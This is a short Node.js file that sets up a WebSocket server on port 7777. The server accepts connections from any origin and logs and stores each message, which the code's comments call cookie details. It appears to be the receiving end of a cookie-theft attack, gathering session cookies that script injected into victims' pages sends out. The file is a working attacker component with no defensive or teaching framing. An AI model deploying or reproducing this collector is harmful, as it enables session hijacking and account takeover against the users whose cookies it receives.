const http = require('http');
const WebSocketServer = require('websocket').server;

const server = http.createServer();
server.listen(7777);

const wsServer = new WebSocketServer({
    httpServer:server
});

var cookies = new Array();

wsServer.on('request', function(request){
    const connection = request.accept(null, request.origin);

    connection.on('message', function(message){
        console.log(message.utf8Data); // print the cookie details.
        cookies.push(message.utf8Data); // save the cookie details.
    });
    connection.on('close', function(reasonCode, description){
        console.log('Socket closed.');
    });
});
